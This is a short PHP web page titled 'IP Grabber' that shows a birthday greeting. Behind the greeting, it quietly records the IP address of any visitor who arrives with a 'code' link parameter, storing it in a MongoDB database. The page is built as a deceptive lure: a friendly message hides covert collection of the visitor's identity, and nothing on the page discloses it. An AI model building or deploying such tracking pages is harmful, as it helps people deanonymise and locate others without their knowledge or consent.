<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Grabber</title>
    <link rel="stylesheet" href="./style.css" type="text/css">
</head>
<body>
    <header>
        <h1>Happy Birthday!!!</h1>
    </header>
    <div class="container">
        <p>I hope you have an amazing birthday!!!</p>
    </div>
    <?php
    if(isset($_GET['code'])){
        $code = $_GET['code'];
        require './vendor/autoload.php';
        $conn = new MongoDB\Client('mongodb://localhost:27017');
        $table = $conn->IPGrabber->ips;
        $ip_address = null;
        if (!empty($_SERVER['HTTP_CLIENT_IP']))   
        {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
        }
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
        {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        else
        {
        $ip_address = $_SERVER['REMOTE_ADDR'];
        }
        if($table->findOne(['ip' => $ip_address, 'code' => $code]) === null){
            $table->insertOne(['ip' => $ip_address, 'code' => $code]);
        }
    }
    ?>
</body>
</html>